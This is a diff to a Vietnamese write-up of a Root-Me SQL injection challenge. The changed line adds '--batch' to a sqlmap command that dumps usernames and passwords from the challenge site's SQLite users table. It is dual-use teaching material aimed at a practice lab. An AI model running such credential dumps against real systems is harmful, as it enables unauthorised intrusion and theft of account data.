@@ -350,7 +350,7 @@ Có được table là database là SQLite_masterdb và tablelaf users, tiếp t
 ![image](https://user-images.githubusercontent.com/104350480/218266871-0b8fc508-a7aa-43b8-aa90-379854202200.png)
  Đã có đủ hết mọi dữ kiện cần thiết, giờ thì dump hết ra là xong:
  
- > Payload: sqlmap.py --dbms=SQLite -D SQLite_masterdb -T users -C "username","password","Year" --dump --data='username=FUZZ&password=FUZZ' -u "challenge01.root-me.org/web-serveur/ch10/"
+ > Payload: sqlmap.py --dbms=SQLite -D SQLite_masterdb -T users -C "username","password","Year" --dump --data='username=FUZZ&password=FUZZ' -u "challenge01.root-me.org/web-serveur/ch10/" --batch
 
 ![image](https://user-images.githubusercontent.com/104350480/218266929-7a48aca2-3ace-4244-9eb7-0a6d0feac4b8.png)
 
